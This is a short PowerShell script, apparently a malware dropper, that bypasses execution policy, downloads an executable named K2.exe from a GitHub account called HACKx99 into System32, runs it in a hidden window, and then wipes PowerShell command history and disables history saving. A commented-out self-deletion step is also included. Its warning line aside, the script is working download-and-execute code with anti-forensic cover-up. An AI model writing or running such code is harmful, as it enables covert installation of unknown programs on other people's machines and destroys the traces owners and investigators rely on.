# PowerShell Script to Download, Save, Run EXE Silently, and Clear History
# WARNING: This script requires Administrator privileges to write to System32.
# Running unknown EXEs can be dangerous - use at your own risk!

try {
    # Bypass execution policy for CurrentUser
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue

    # Define paths and URL (use raw GitHub URL for direct download)
    $exeUrl = "https://raw.githubusercontent.com/HACKx99/WebSite/main/K2.exe"
    $system32Path = "$env:windir\System32\K2.exe"
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    # Download the EXE to System32
    Invoke-WebRequest -Uri $exeUrl -OutFile $system32Path -UseBasicParsing

    # Verify download and run silently
    if (Test-Path $system32Path) {
        Start-Process -FilePath $system32Path -WindowStyle Hidden -NoNewWindow
    } else {
        throw "Download failed - file not found at $system32Path"
    }

    # Forcefully clear PowerShell history
    Clear-History -ErrorAction SilentlyContinue
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
    }
    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue

    Write-Output "Script executed successfully. EXE downloaded to System32 and run silently. History cleared."
} catch {
    Write-Error "Error: $($_.Exception.Message)"
    exit 1
} finally {
    # Optional: Self-delete if saved as .ps1 (uncomment if needed)
    # if ($MyInvocation.MyCommand.Path) { Remove-Item $MyInvocation.MyCommand.Path -Force }
    exit 0
}
